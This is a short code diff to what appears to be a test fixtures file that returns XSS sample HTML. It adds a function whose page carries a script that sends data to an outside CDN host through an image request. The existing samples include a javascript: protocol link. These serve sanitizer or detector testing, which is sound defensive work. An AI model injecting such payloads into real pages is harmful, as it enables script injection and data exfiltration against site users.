@@ -54,3 +54,15 @@ export function xssIframe(): string {
 export function xssJavascriptProtocol(): string {
   return `<html><body><a href="javascript:alert(1)">Click</a><p>Test</p></body></html>`;
 }
+
+export function xssCdnExfiltration(): string {
+  return `
+    <html><body>
+      <p>Content</p>
+      <script>
+        var img = new Image();
+        img.src = 'https://cdn.jsdelivr.net/npm/foo?' + 'a'.repeat(3000);
+      </script>
+    </body></html>
+  `;
+}
